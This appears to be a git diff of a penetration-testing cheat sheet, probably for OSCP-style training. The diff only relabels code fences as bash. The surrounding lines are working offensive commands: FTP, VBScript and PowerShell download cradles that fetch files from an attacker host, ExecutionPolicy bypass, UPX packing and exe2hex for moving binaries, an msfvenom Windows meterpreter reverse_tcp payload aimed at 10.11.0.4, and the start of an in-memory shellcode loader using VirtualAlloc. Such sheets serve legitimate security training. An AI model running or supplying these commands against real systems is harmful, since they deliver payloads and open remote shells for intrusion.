@@ -557,7 +557,7 @@ perl -le "use File::Fetch; my $ff = File::Fetch->new(uri => 'http://$source_ip/t
 
 ```
 
-```
+```bash
 echo open $source_ip 21> ftp.txt
 echo USER offsec>> ftp.txt # username
 echo ftp>> ftp.txt # password
@@ -566,10 +566,10 @@ echo GET [file]>> ftp.txt
 echo bye>> ftp.txt
 ftp -v -n -s:ftp.txt
 ```
-```
+```bash
 echo open $source_ip 21>ftp.txt&echo USER offsec>>ftp.txt&echo ftp>>ftp.txt&echo bin>>ftp.txt&echo GET [file]>>ftp.txt&echo bye>>ftp.txt&ftp -v -n -s:ftp.txt
 ```
-```
+```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
 echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
@@ -598,7 +598,7 @@ echo ts.Close >> wget.vbs
 cscript wget.vbs http://$source_ip/[file] [file]
 ```
 
-```
+```bash
 echo $storageDir = $pwd >wget.ps1
 echo $webclient = New-Object System.Net.WebClient >>wget.ps1
 echo $url = "http://$source_ip/[file]" >>wget.ps1
@@ -607,7 +607,7 @@ echo $webclient.DownloadFile($url,$file) >>wget.ps1
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 ```
 
-```
+```bash
 upx -9 [.exe] # pack and compress a binary you wanna transfer
 ls -lah [.exe] # check whether it is less than 64kb
 exe2hex [.exe] # alternatively, `wine /usr/share/windows-binaries/exe2bat.exe [.exe] [.bat]`
@@ -615,10 +615,10 @@ cat [.bat] | xclip -selection c # if remotely accessing kali, use `ssh -X`, a bi
 ```
 
 In memory shell code execution with Powershell:
-```
+```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powershell
 ```
-```
+```bash
 $code = '
 [DllImport("kernel32.dll")]
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocat ionType, uint flProtect);
